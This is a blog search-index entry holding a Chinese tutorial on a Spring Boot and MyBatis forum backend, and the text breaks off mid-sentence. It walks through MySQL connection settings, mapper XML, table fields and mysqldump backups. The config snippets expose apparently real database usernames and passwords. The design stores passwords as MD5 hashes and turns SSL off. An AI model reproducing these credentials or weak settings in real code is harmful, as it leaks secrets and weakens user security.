<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java web bbs</title>
      <link href="/2024/06/06/bbs/"/>
      <url>/2024/06/06/bbs/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>根据实际情况选择数据库，选择的是mysql version 为 8.0.37 MySQL Community Server</p><p>在resources下application.properties文件里规定服务器的各类配置</p><h4 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">properties复制代码server.port=8080</span><br><span class="line">spring.thymeleaf.cache=false</span><br></pre></td></tr></table></figure><ul><li><code>server.port=8080</code>：指定Spring Boot应用运行的端口号为8080。</li><li><code>spring.thymeleaf.cache=false</code>：禁用Thymeleaf模板的缓存，以便在开发过程中实时查看更改效果。</li></ul><h4 id="数据源配置"><a href="#数据源配置" class="headerlink" title="数据源配置"></a>数据源配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">properties复制代码spring.datasource.name=my-bbs-datasource</span><br><span class="line">spring.datasource.driverClassName=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/my_bbs_db?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;allowMultiQueries=true</span><br><span class="line">spring.datasource.username=Margit</span><br><span class="line">spring.datasource.password=8750613a</span><br></pre></td></tr></table></figure><ul><li><code>spring.datasource.name=my-bbs-datasource</code>：数据源的名称。</li><li><code>spring.datasource.driverClassName=com.mysql.cj.jdbc.Driver</code>：指定MySQL JDBC驱动。</li><li><code>spring.datasource.url=jdbc:mysql://localhost:3306/my_bbs_db?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;allowMultiQueries=true</code>：数据库连接的URL，包含了字符编码、时区、SSL等配置。</li><li><code>spring.datasource.username=Margit</code>：数据库用户名。</li><li><code>spring.datasource.password=8750613a</code>：数据库密码。</li></ul><h4 id="HikariCP连接池配置"><a href="#HikariCP连接池配置" class="headerlink" title="HikariCP连接池配置"></a>HikariCP连接池配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">properties复制代码spring.datasource.hikari.minimum-idle=5</span><br><span class="line">spring.datasource.hikari.maximum-pool-size=15</span><br><span class="line">spring.datasource.hikari.auto-commit=true</span><br><span class="line">spring.datasource.hikari.idle-timeout=60000</span><br><span class="line">spring.datasource.hikari.pool-name=hikariCP</span><br><span class="line">spring.datasource.hikari.max-lifetime=600000</span><br><span class="line">spring.datasource.hikari.connection-timeout=30000</span><br><span class="line">spring.datasource.hikari.connection-test-query=SELECT 1</span><br></pre></td></tr></table></figure><ul><li><code>spring.datasource.hikari.minimum-idle=5</code>：连接池中最小空闲连接数。</li><li><code>spring.datasource.hikari.maximum-pool-size=15</code>：连接池中最大连接数。</li><li><code>spring.datasource.hikari.auto-commit=true</code>：设置自动提交。</li><li><code>spring.datasource.hikari.idle-timeout=60000</code>：连接空闲时间（毫秒），超过该时间连接将被释放。</li><li><code>spring.datasource.hikari.pool-name=hikariCP</code>：连接池名称。</li><li><code>spring.datasource.hikari.max-lifetime=600000</code>：连接的最大生命周期（毫秒），超过该时间连接将被关闭。</li><li><code>spring.datasource.hikari.connection-timeout=30000</code>：等待连接的最大时间（毫秒）。</li><li><code>spring.datasource.hikari.connection-test-query=SELECT 1</code>：测试连接的SQL查询。</li></ul><h4 id="MyBatis配置"><a href="#MyBatis配置" class="headerlink" title="MyBatis配置"></a>MyBatis配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">properties</span><br><span class="line">复制代码</span><br><span class="line">mybatis.mapper-locations=classpath:mapper/*Mapper.xml</span><br></pre></td></tr></table></figure><ul><li><code>mybatis.mapper-locations=classpath:mapper/*Mapper.xml</code>：指定MyBatis的Mapper文件位置。</li></ul><h4 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">properties</span><br><span class="line">复制代码</span><br><span class="line">logging.level.com.my.bbs.dao=debug</span><br></pre></td></tr></table></figure><ul><li><code>logging.level.com.my.bbs.dao=debug</code>：设置包<code>com.my.bbs.dao</code>下的日志级别为<code>debug</code>，便于调试。</li></ul><p>确保数据安全和防止数据丢失，要进行date的备份，使用<code>mysqldump</code>工具备份MySQL数据库：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh复制代码# 备份整个数据库</span><br><span class="line">mysqldump -u username -p database_name &gt; /path/to/backup/backup.sql</span><br><span class="line"></span><br><span class="line"># 备份所有数据库</span><br><span class="line">mysqldump -u username -p --all-databases &gt; /path/to/backup/all_databases.sql</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h4><p>在管理数据库的选择上，选择的是Navicat，可以有效的管理数据库。</p><h4 id="sql文件"><a href="#sql文件" class="headerlink" title="sql文件"></a>sql文件</h4><p><strong>包含了创建名为<code>tb_bbs_post</code>的MySQL表的结构。这个表用于存储论坛帖子的相关信息。每个帖子有一个唯一的主键<code>post_id</code>，以及发布者ID、帖子标题、内容等字段。</strong></p><p><strong>创建了名为tb_bbs_post的mysql表，用于存储帖子user的相关内容：</strong></p><ul><li><strong>存储用户信息，包括登录名、密码、昵称、头像等。</strong></li><li><strong>每个用户有一个唯一的主键<code>user_id</code>。</strong></li><li><strong><code>login_name</code>字段用于用户登录，<code>password_md5</code>字段存储密码的MD5加密值。</strong></li><li><strong><code>user_status</code>字段表示用户状态，0表示正常，1表示禁言；<code>is_admin</code>字段表示用户是否为管理员。</strong></li><li><strong><code>last_login_time</code>字段记录用户最后登录时间，<code>create_time</code>字段记录用户注册时间。</strong></li></ul><p><strong>创建了名为tb_bbs_post的mysql表，用于存储帖子的post的内容</strong></p><p><code>tb_post_category</code>：</p><ul><li><p><strong>存储帖子分类信息，包括分类名称和排序值。</strong></p></li><li><p><strong>每个分类有一个唯一的主键<code>category_id</code>。</strong></p></li><li><p><strong><code>category_name</code>字段存储分类名称，<code>category_rank</code>字段表示分类的排序值。</strong></p></li><li><p><strong><code>is_deleted</code>字段表示分类是否被删除，0表示未删除，1表示已删除。</strong></p></li><li><p><strong><code>create_time</code>字段记录分类创建时间。</strong></p></li><li><p><code>tb_post_collect_record</code>：</p><ul><li><strong>存储帖子收藏记录，包括帖子ID和用户ID。</strong></li><li><strong>每条记录有一个唯一的主键<code>record_id</code>。</strong></li><li><strong><code>post_id</code>字段表示收藏的帖子ID，<code>user_id</code>字段表示收藏者的用户ID。</strong></li><li><strong><code>create_time</code>字段记录收藏记录的创建时间。</strong></li></ul><p><code>tb_post_comment</code>：</p><ul><li><strong>存储帖子评论信息，包括帖子ID、评论者ID、评论内容等。</strong></li><li><strong>每条评论有一个唯一的主键<code>comment_id</code>。</strong></li><li><strong><code>post_id</code>字段表示评论所属的帖子ID，<code>comment_user_id</code>字段表示评论者的用户ID。</strong></li><li><strong><code>comment_body</code>字段存储评论内容，<code>parent_comment_user_id</code>字段表示所回复的上一级评论的用户ID。</strong></li><li><code>comment_create_time</code>字段记录评论的创建时间，<code>is_deleted</code>字段表示评论是否被删除。</li></ul></li></ul><h4 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h4><p>my_bbs_dbMapper.xml文件用来定义与数据库交互的SQL映射</p><p>其中的这个<code>resultMap</code>定义了数据库表到Java对象的映射关系。每个<code>&lt;result&gt;</code>标签指定了数据库列（<code>column</code>）与Java对象属性（<code>property</code>）之间的映射关系，以及列的JDBC类型（<code>jdbcType</code>）。这个<code>resultMap</code>扩展了<code>BaseResultMap</code>，添加了对大文本（BLOB）的支持，映射了<code>post_content</code>列。这个SQL片段定义了一个动态生成的<code>WHERE</code>子句，用于根据条件动态构建查询语句。<code>&lt;foreach&gt;</code>、<code>&lt;if&gt;</code>、<code>&lt;choose&gt;</code>等标签用来遍历条件并生成相应的SQL语句。这个SQL片段与<code>Example_Where_Clause</code>类似，但用于更新操作中的<code>WHERE</code>子句。<code>Base_Column_List</code> 和 <code>Blob_Column_List</code> 定义了基础列和BLOB列的列表，用于复用。</p><p><code>selectByExampleWithBLOBs</code> 和 <code>selectByExample</code> 定义了查询方法，分别用于查询包含BLOB列和不包含BLOB列的数据。</p><p>这些查询方法根据参数动态生成SQL语句，包括<code>distinct</code>、<code>WHERE</code>子句和<code>ORDER BY</code>子句。</p><ul><li><code>selectByExample</code> 和 <code>selectByPrimaryKey</code> 定义了查询方法，分别用于根据条件和主键查询数据。</li><li><code>deleteByPrimaryKey</code> 和 <code>deleteByExample</code> 定义了删除方法，分别用于根据主键和条件删除数据。</li><li><code>insert</code> 和 <code>insertSelective</code> 定义了插入方法，分别用于插入完整记录和选择性插入记录。</li><li><code>countByExample</code> 用于根据条件统计记录数量。</li></ul><p>这些SQL映射定义了与数据库表<code>tb_bbs_post</code>的基本CRUD操作，利用MyBatis动态生成SQL语句，提高了代码的灵活性和可维护性。</p><p><code>countByExample</code> 用于根据条件统计记录数量。</p><p><code>updateByExampleSelective</code> 用于根据条件选择性地更新记录。</p><p><code>updateByExampleWithBLOBs</code> 和 <code>updateByExample</code> 用于根据条件更新记录，分别包括和不包括BLOB字段。</p><p><code>updateByPrimaryKeySelective</code> 和 <code>updateByPrimaryKeyWithBLOBs</code> 用于根据主键更新记录，分别选择性更新和更新所有字段。<code>update</code>方法更新所有字段，包括<code>post_content</code>。</p><p><code>updateByPrimaryKey</code>方法更新所有字段，但不包括<code>post_content</code>。</p><p>这两个更新操作都是根据主键<code>post_id</code>进行的。</p><p>在这个文件中mybatisGeneratorConfig.xml用于生成与MyBatis ORM框架一起使用的Java对象和Mapper文件。根节点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml</span><br><span class="line">复制代码</span><br><span class="line">&lt;generatorConfiguration&gt;</span><br></pre></td></tr></table></figure><ul><li>表示MyBatis Generator的配置文件开始。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml</span><br><span class="line">复制代码</span><br><span class="line">&lt;context id=&quot;DB2Tables&quot; targetRuntime=&quot;MyBatis3&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>id</code>：上下文的标识符。</li><li><code>targetRuntime</code>：指定生成代码的运行时环境，<code>MyBatis3</code>表示生成MyBatis 3.x兼容代码。</li></ul><h5 id="数据库连接配置"><a href="#数据库连接配置" class="headerlink" title="数据库连接配置"></a>数据库连接配置</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;jdbcConnection driverClass=&quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">    connectionURL=&quot;jdbc:mysql://localhost:3306/my_bbs_db?serverTimezone=UTC&quot;</span><br><span class="line">    userId=&quot;mengnankk&quot;</span><br><span class="line">    password=&quot;Zyk2215290444&quot;&gt;</span><br><span class="line">&lt;/jdbcConnection&gt;</span><br></pre></td></tr></table></figure><ul><li><code>driverClass</code>：JDBC驱动类名。</li><li><code>connectionURL</code>：数据库连接URL。</li><li><code>userId</code>：数据库用户名。</li><li><code>password</code>：数据库密码。</li></ul><h5 id="Java类型解析器"><a href="#Java类型解析器" class="headerlink" title="Java类型解析器"></a>Java类型解析器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;javaTypeResolver&gt;</span><br><span class="line">    &lt;property name=&quot;forceBigDecimals&quot; value=&quot;false&quot;/&gt;</span><br><span class="line">&lt;/javaTypeResolver&gt;</span><br></pre></td></tr></table></figure><ul><li>用于解析数据库类型到Java类型。</li><li><code>forceBigDecimals</code>：设置为<code>false</code>表示不强制使用<code>BigDecimal</code>类型。</li></ul><h5 id="Java模型生成器"><a href="#Java模型生成器" class="headerlink" title="Java模型生成器"></a>Java模型生成器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;javaModelGenerator targetPackage=&quot;com.my.bbs&quot;</span><br><span class="line">                    targetProject=&quot;src/main/java&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">&lt;/javaModelGenerator&gt;</span><br></pre></td></tr></table></figure><ul><li><code>targetPackage</code>：生成的模型类包名。</li><li><code>targetProject</code>：生成的模型类文件所在的项目路径。</li><li><code>enableSubPackages</code>：设置为<code>true</code>表示支持子包。</li><li><code>trimStrings</code>：设置为<code>true</code>表示自动去除字符串两端的空格。</li></ul><h5 id="SQL映射文件生成器"><a href="#SQL映射文件生成器" class="headerlink" title="SQL映射文件生成器"></a>SQL映射文件生成器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;sqlMapGenerator targetPackage=&quot;com.my.bbs&quot;</span><br><span class="line">                 targetProject=&quot;src/main/resources&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">&lt;/sqlMapGenerator&gt;</span><br></pre></td></tr></table></figure><ul><li><code>targetPackage</code>：生成的SQL映射文件包名。</li><li><code>targetProject</code>：生成的SQL映射文件所在的项目路径。</li><li><code>enableSubPackages</code>：设置为<code>true</code>表示支持子包。</li></ul><h5 id="Java客户端生成器"><a href="#Java客户端生成器" class="headerlink" title="Java客户端生成器"></a>Java客户端生成器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;javaClientGenerator type=&quot;XMLMAPPER&quot;</span><br><span class="line">                     targetPackage=&quot;com.my.bbs&quot;</span><br><span class="line">                     targetProject=&quot;src/main/java&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">&lt;/javaClientGenerator&gt;</span><br></pre></td></tr></table></figure><ul><li><code>type</code>：指定生成的Java客户端类型，<code>XMLMAPPER</code>表示生成XML映射文件的Mapper接口。</li><li><code>targetPackage</code>：生成的Mapper接口包名。</li><li><code>targetProject</code>：生成的Mapper接口所在的项目路径。</li><li><code>enableSubPackages</code>：设置为<code>true</code>表示支持子包。</li></ul><h5 id="指定生成的表及对应的实体类"><a href="#指定生成的表及对应的实体类" class="headerlink" title="指定生成的表及对应的实体类"></a>指定生成的表及对应的实体类</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;table tableName=&quot;tb_bbs_user&quot; domainObjectName=&quot;my_bbs_db&quot;/&gt;</span><br><span class="line">&lt;table tableName=&quot;tb_bbs_post&quot; domainObjectName=&quot;my_bbs_db&quot;/&gt;</span><br></pre></td></tr></table></figure><ul><li><code>tableName</code>：指定数据库中的表名。</li><li><code>domainObjectName</code>：指定生成的实体类名。</li></ul><p>这个配置文件通过指定数据库连接、模型生成器、SQL映射文件生成器和Java客户端生成器等信息，生成与<code>tb_bbs_user</code>和<code>tb_bbs_post</code>表相关的Java对象和MyBatis Mapper文件。你可以添加更多的<code>&lt;table&gt;</code>节点来生成其他表的映射。</p><h4 id="datemapper"><a href="#datemapper" class="headerlink" title="datemapper"></a>datemapper</h4><h5 id="BBSPostCategory"><a href="#BBSPostCategory" class="headerlink" title="BBSPostCategory"></a>BBSPostCategory</h5><h6 id="根节点"><a href="#根节点" class="headerlink" title="根节点"></a>根节点</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml</span><br><span class="line">复制代码</span><br><span class="line">&lt;mapper namespace=&quot;com.my.bbs.dao.BBSPostCategoryMapper&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>定义了该Mapper文件的命名空间，通常是对应的DAO接口的全限定名。</li></ul><h6 id="ResultMap"><a href="#ResultMap" class="headerlink" title="ResultMap"></a>ResultMap</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    &lt;id column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;category_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryName&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;category_rank&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryRank&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;is_deleted&quot; jdbcType=&quot;TINYINT&quot; property=&quot;isDeleted&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt;</span><br><span class="line">&lt;/resultMap&gt;</span><br></pre></td></tr></table></figure><ul><li>定义了<code>BBSPostCategory</code>实体类与数据库表<code>tb_post_category</code>的映射关系。</li></ul><h6 id="SQL片段"><a href="#SQL片段" class="headerlink" title="SQL片段"></a>SQL片段</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;sql id=&quot;Base_Column_List&quot;&gt;</span><br><span class="line">    category_id, category_name, category_rank, is_deleted, create_time</span><br><span class="line">&lt;/sql&gt;</span><br></pre></td></tr></table></figure><ul><li>定义了一个可重用的SQL片段，包含所有的列名。</li></ul><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h6 id="根据主键查询"><a href="#根据主键查询" class="headerlink" title="根据主键查询"></a>根据主键查询</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;select id=&quot;selectByPrimaryKey&quot; parameterType=&quot;java.lang.Integer&quot; resultMap=&quot;BaseResultMap&quot;&gt;</span><br><span class="line">    select </span><br><span class="line">    &lt;include refid=&quot;Base_Column_List&quot; /&gt;</span><br><span class="line">    from tb_post_category</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><ul><li>根据<code>category_id</code>查询对应的记录。</li></ul><h6 id="查询所有未删除的类别"><a href="#查询所有未删除的类别" class="headerlink" title="查询所有未删除的类别"></a>查询所有未删除的类别</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;select id=&quot;getBBSPostCategories&quot; resultMap=&quot;BaseResultMap&quot;&gt;</span><br><span class="line">    select</span><br><span class="line">    &lt;include refid=&quot;Base_Column_List&quot; /&gt;</span><br><span class="line">    from tb_post_category</span><br><span class="line">    where is_deleted = 0 order by category_rank desc</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><ul><li>查询所有<code>is_deleted</code>字段为<code>0</code>的记录，并按<code>category_rank</code>降序排列。</li></ul><h6 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;delete id=&quot;deleteByPrimaryKey&quot; parameterType=&quot;java.lang.Integer&quot;&gt;</span><br><span class="line">    delete from tb_post_category</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">&lt;/delete&gt;</span><br></pre></td></tr></table></figure><ul><li>根据<code>category_id</code>删除对应的记录。</li></ul><h6 id="全字段插入"><a href="#全字段插入" class="headerlink" title="全字段插入"></a>全字段插入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;insert id=&quot;insert&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    insert into tb_post_category (category_id, category_name, category_rank, </span><br><span class="line">      is_deleted, create_time)</span><br><span class="line">    values (#&#123;categoryId,jdbcType=INTEGER&#125;, #&#123;categoryName,jdbcType=VARCHAR&#125;, #&#123;categoryRank,jdbcType=INTEGER&#125;, </span><br><span class="line">      #&#123;isDeleted,jdbcType=TINYINT&#125;, #&#123;createTime,jdbcType=TIMESTAMP&#125;)</span><br><span class="line">&lt;/insert&gt;</span><br></pre></td></tr></table></figure><ul><li>插入一条新的记录，所有字段都必须提供值。</li></ul><h6 id="选择性插入"><a href="#选择性插入" class="headerlink" title="选择性插入"></a>选择性插入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;insert id=&quot;insertSelective&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    insert into tb_post_category</span><br><span class="line">    &lt;trim prefix=&quot;(&quot; suffix=&quot;)&quot; suffixOverrides=&quot;,&quot;&gt;</span><br><span class="line">      &lt;if test=&quot;categoryId != null&quot;&gt;</span><br><span class="line">        category_id,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryName != null&quot;&gt;</span><br><span class="line">        category_name,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryRank != null&quot;&gt;</span><br><span class="line">        category_rank,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;isDeleted != null&quot;&gt;</span><br><span class="line">        is_deleted,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;createTime != null&quot;&gt;</span><br><span class="line">        create_time,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">    &lt;/trim&gt;</span><br><span class="line">    &lt;trim prefix=&quot;values (&quot; suffix=&quot;)&quot; suffixOverrides=&quot;,&quot;&gt;</span><br><span class="line">      &lt;if test=&quot;categoryId != null&quot;&gt;</span><br><span class="line">        #&#123;categoryId,jdbcType=INTEGER&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryName != null&quot;&gt;</span><br><span class="line">        #&#123;categoryName,jdbcType=VARCHAR&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryRank != null&quot;&gt;</span><br><span class="line">        #&#123;categoryRank,jdbcType=INTEGER&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;isDeleted != null&quot;&gt;</span><br><span class="line">        #&#123;isDeleted,jdbcType=TINYINT&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;createTime != null&quot;&gt;</span><br><span class="line">        #&#123;createTime,jdbcType=TIMESTAMP&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">    &lt;/trim&gt;</span><br><span class="line">  &lt;/insert&gt;</span><br></pre></td></tr></table></figure><ul><li>仅插入有值的字段。</li></ul><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><h6 id="选择性更新"><a href="#选择性更新" class="headerlink" title="选择性更新"></a>选择性更新</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;update id=&quot;updateByPrimaryKeySelective&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    update tb_post_category</span><br><span class="line">    &lt;set&gt;</span><br><span class="line">      &lt;if test=&quot;categoryName != null&quot;&gt;</span><br><span class="line">        category_name = #&#123;categoryName,jdbcType=VARCHAR&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryRank != null&quot;&gt;</span><br><span class="line">        category_rank = #&#123;categoryRank,jdbcType=INTEGER&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;isDeleted != null&quot;&gt;</span><br><span class="line">        is_deleted = #&#123;isDeleted,jdbcType=TINYINT&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;createTime != null&quot;&gt;</span><br><span class="line">        create_time = #&#123;createTime,jdbcType=TIMESTAMP&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">    &lt;/set&gt;</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">  &lt;/update&gt;</span><br></pre></td></tr></table></figure><ul><li>仅更新有值的字段。</li></ul><h6 id="全字段更新"><a href="#全字段更新" class="headerlink" title="全字段更新"></a>全字段更新</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml复制代码&lt;update id=&quot;updateByPrimaryKey&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    update tb_post_category</span><br><span class="line">    set category_name = #&#123;categoryName,jdbcType=VARCHAR&#125;,</span><br><span class="line">      category_rank = #&#123;categoryRank,jdbcType=INTEGER&#125;,</span><br><span class="line">      is_deleted = #&#123;isDeleted,jdbcType=TINYINT&#125;,</span><br><span class="line">      create_time = #&#123;createTime,jdbcType=TIMESTAMP&#125;</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">  &lt;/update&gt;</span><br></pre></td></tr></table></figure><h4 id="MyBatis-Mapper"><a href="#MyBatis-Mapper" class="headerlink" title="MyBatis Mapper"></a>MyBatis Mapper</h4><p>好的，我们直接来分析这个MyBatis Mapper文件的功能和结构，而不再打印具体代码。</p><ol><li><p><strong>ResultMap</strong>:</p><ul><li>定义了实体类与数据库表的映射关系。<code>BaseResultMap</code> 映射 <code>record_id</code>, <code>post_id</code>, <code>user_id</code>, <code>create_time</code> 到实体类的相应属性。</li></ul></li><li><p><strong>Base_Column_List</strong>:</p><ul><li>定义了表中的列，以便在SQL查询中复用，减少重复代码。</li></ul></li><li><p><strong>selectByPrimaryKey</strong>:</p><ul><li>通过主键 <code>record_id</code> 查询记录，返回单条记录映射到 <code>BBSPostCollect</code> 实体类。</li></ul></li><li><p><strong>selectByUserIdAndPostId</strong>:</p><ul><li>根据 <code>user_id</code> 和 <code>post_id</code> 查询单条记录，用于检查特定用户是否收藏了特定帖子。</li></ul></li><li><p><strong>listByUserId</strong>:</p><ul><li>根据 <code>user_id</code> 查询用户收藏的所有帖子，返回结果列表映射到 <code>BBSPostCollect</code> 实体类。</li></ul></li><li><p><strong>deleteByPrimaryKey</strong>:</p><ul><li>根据主键 <code>record_id</code> 删除记录。</li></ul></li><li><p><strong>insert</strong>:</p><ul><li>插入一条新的收藏记录，所有字段必须有值。</li></ul></li><li><p><strong>insertSelective</strong>:</p><ul><li>插入一条新的收藏记录，允许部分字段为空，只插入非空字段。</li></ul></li><li><p><strong>updateByPrimaryKeySelective</strong>:</p><ul><li>更新一条记录，根据主键 <code>record_id</code> 更新非空字段。</li></ul></li><li><p><strong>updateByPrimaryKey</strong>:</p><ul><li>更新一条记录，根据主键 <code>record_id</code> 更新所有字段。</li></ul></li></ol><p>这个MyBatis Mapper文件定义了与 <code>BBSPostCollect</code> 实体类相关的数据库操作，具体包括查询、插入、更新和删除操作。它使用了 <code>ResultMap</code> 映射数据库表 <code>tb_post_collect_record</code> 的列与实体类属性之间的关系，并通过 <code>Base_Column_List</code> 片段复用列定义。</p><p>主要功能包括：</p><ul><li><strong>selectByPrimaryKey</strong>：根据主键 <code>record_id</code> 查询记录。</li><li><strong>selectByUserIdAndPostId</strong>：根据 <code>user_id</code> 和 <code>post_id</code> 查询单条记录，用于检查特定用户是否收藏了特定帖子。</li><li><strong>listByUserId</strong>：根据 <code>user_id</code> 查询用户收藏的所有帖子。</li><li><strong>deleteByPrimaryKey</strong>：根据主键 <code>record_id</code> 删除记录。</li><li><strong>insert</strong>：插入一条新的收藏记录，所有字段必须有值。</li><li><strong>insertSelective</strong>：插入一条新的收藏记录，允许部分字段为空。</li><li><strong>updateByPrimaryKeySelective</strong>：根据主键 <code>record_id</code> 更新非空字段。</li><li><strong>updateByPrimaryKey</strong>：根据主键 <code>record_id</code> 更新所有字段。</li></ul><p>通过这些定义，可以实现对 <code>tb_post_collect_record</code> 表的基本CRUD操作，并且可以根据不同的条件进行查询和更新。</p><p>用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。</p><p>用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。</p><h4 id="BBSPostCommentMapper-xml"><a href="#BBSPostCommentMapper-xml" class="headerlink" title="BBSPostCommentMapper.xml"></a>BBSPostCommentMapper.xml</h4><p>用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。</p><h4 id="BBSPostMapper-xml"><a href="#BBSPostMapper-xml" class="headerlink" title="BBSPostMapper.xml"></a>BBSPostMapper.xml</h4><p>这个 XML 文件是用于 MyBatis 的数据库映射配置，它定义了与帖子相关的数据库操作，主要包括：</p><ul><li><p><strong>结果映射（ResultMap）</strong>：定义了两个结果映射，<code>BaseResultMap</code> 和 <code>ResultMapWithBLOBs</code>，用于将数据库查询结果映射到实体类 <code>BBSPost</code> 的属性。</p></li><li><p><strong>SQL 片段（SQL Fragments）</strong>：定义了两个 SQL 片段，<code>Base_Column_List</code> 和 <code>Blob_Column_List</code>，用于在查询语句中引用基本列和长文本列。</p></li><li><p><strong>查询操作（Select 